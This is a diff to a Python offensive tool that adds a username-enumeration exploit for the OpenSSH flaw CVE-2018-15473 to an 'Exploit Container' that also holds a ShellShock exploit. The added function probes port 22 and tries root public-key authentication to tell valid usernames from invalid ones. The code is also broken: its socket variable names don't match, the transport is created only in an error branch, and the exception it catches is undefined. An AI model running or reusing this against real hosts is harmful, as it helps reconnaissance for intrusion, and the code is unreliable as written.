@@ -155,6 +155,25 @@ def ShellShock():
 	except:
 		print('Exploit failed...\n')
 		pass
+def SSHenum():
+	try:
+		print('Using CVE:2018-15473')
+		SSHsocket = socket.socket()
+		try:
+			SSHsock.connect((address, 22))
+		except socket.error:
+			print '[-] Failed to connect'
+			transport = paramiko.transport.Transport(SSHsock)
+		try:
+			transport.start_client()
+		except paramiko.ssh_exception.SSHException:
+			print '[-] Failed to negotiate SSH transport'
+		try:
+			transport.auth_publickey('root', paramiko.RSAKey.generate(2048))
+		except InvalidUsername:
+			print '[*] Invalid username'
+		except paramiko.ssh_exception.AuthenticationException:
+			print '[+] Valid username'
 #End Of Exploit Container
 #########################################################################
 def find_service_name():
